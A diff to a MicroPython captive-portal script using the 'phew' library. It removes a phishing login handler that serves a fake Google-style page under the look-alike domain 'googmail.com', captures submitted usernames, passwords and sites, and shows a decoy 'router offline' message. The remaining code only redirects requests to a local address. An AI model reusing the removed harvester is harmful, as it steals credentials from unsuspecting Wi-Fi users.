@@ -8,10 +8,11 @@
 #
 # with your wifi details instead of <ssid> and <password>.
 
-from phew import server, connect_to_wifi, access_point
-from phew.template import render_template
+#import _thread
+
+from phew import dns, server, connect_to_wifi, access_point
 from phew.dns import run_catchall
-import time
+from phew.template import render_template
 
 import secrets
 
@@ -56,51 +57,15 @@ def random_number(request):
 #def catchall(request):
 #  return "Not found", 404
 
-'''
-The html file is being preloaded and saved as Response.
-That way, it doesn't have to be opened everytime it is
-server (when using render_template)
-'''
-with open("templates/goog.html", "r") as html_file:
-    LOGIN_RESPONSE = server.Response(status=200, headers={"Content-Type": "text/html"}, body=html_file.read())
-
-# Default response when someone logs in
-SUCCESS_RESPONSE = server.Response(status=200, headers={"Content-Type": "text/html"}, body="Router is offline right now, try again another time.")
-DOMAIN = 'googmail.com'
-captured_time = 0
-WAITING = True
-captured_time = 0
-WAITING = True
-last_capture = {}
-amount_of_captures = 0
-DOMAIN = 'googmail.com'
-
-@server.route("/login", methods=["GET", "POST"])
-def login_page(request):
-  global captured_time, WAITING, last_capture, amount_of_captures, DOMAIN
-
-  if request.method == "GET":
-    return LOGIN_RESPONSE
-  else:
-    if request.form:
-      username = request.form['username']
-      password = request.form['password']
-      website = request.form['website']
-      print(f"{username},{password},{website}\n")
-
-    captured_time = time.time()
-    last_capture = request.form
-    amount_of_captures += 1
-    WAITING = False
-
-    return SUCCESS_RESPONSE
 
 #DNS catchall to redirect every request
 @server.catchall()
 def catchall(request):
-    return server.redirect("http://" + DOMAIN + "/login")
-    #return server.redirect("http://192.168.4.1/hello/my_name")
+    #return server.redirect("http://" + DOMAIN + "/login")
+    return server.redirect("http://192.168.4.1")
 
+# Running threads and server
+#_thread.start_new_thread(animate, [])
 run_catchall(wlan_AP_IF.ifconfig()[0])
 # start the webserver
 server.run()
